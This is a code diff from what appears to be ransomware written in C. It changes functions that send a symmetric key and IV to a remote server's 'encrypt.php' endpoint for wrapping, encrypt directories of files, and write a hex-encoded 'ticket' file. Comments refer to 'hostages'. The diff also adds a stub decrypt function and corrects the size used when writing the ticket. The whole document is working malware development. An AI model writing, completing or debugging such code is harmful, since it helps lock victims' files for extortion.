@@ -9,9 +9,9 @@
 #include <stdlib.h>
 #include <stdbool.h>
 
-int encryptSymmetricKey(char** encrypted_key, const int pubkeyid, const char* key){
+int encryptSymmetricKey(char** encrypted_key, const int pubkeyid, const char* keyiv){
 	//Get key in hex
-	char* hexkey=b16encode(key,SYMMETRIC_KEY_SIZE);
+	char* hexkey=b16encode(keyiv,SYMMETRIC_KEY_SIZE+SYMMETRIC_IV_SIZE);
 	
 	//Base url
 	const char* base_url=SERVER_OSIR_HOME "/client-interface/encrypt.php";
@@ -83,11 +83,16 @@ bool partialEncryptFile(const char* keyiv, const char* filename, int64_t number_
 	
 }
 
+bool decryptDirectory(const char* keyiv, const char* directory){
+	char** ls=walkDir(directory);
+	return 1;
+}
+
 bool encryptDirectory(const char* directory){
 	char** ls=walkDir(directory);
 	
 	//Check for existing ticket
-	for (int i = 0; ls[i][0] == TICKET_FILENAME[0]; i++)
+	for (int i = 0; ls[i][0] == '.'; i++)
 		if (strcmp(ls[i],TICKET_FILENAME)){
 			//If there are no hostages, rm ticket
 			//else
@@ -132,11 +137,12 @@ bool encryptDirectory(const char* directory){
 	//Make hex ticket
 	printf("Encrypted_key %s\n",encrypted_key);
 	char* ticket=b16encode(raw_ticket,2+encrypted_key_size);
+	int ticket_size=(2+encrypted_key_size)*2;
 	printf("Ticket: %s\n",ticket);
 	
 	//Write ticket to file
-	FILE* ticket_fp=fopen(TICKET_FILENAME,"wb");
-	fwrite(ticket,1,2+encrypted_key_size,ticket_fp);
+	FILE* ticket_fp = fopen(TICKET_FILENAME, "wb");
+	fwrite(ticket, 1, ticket_size, ticket_fp);
 	fclose(ticket_fp);
 	
 	//Free each element in ls
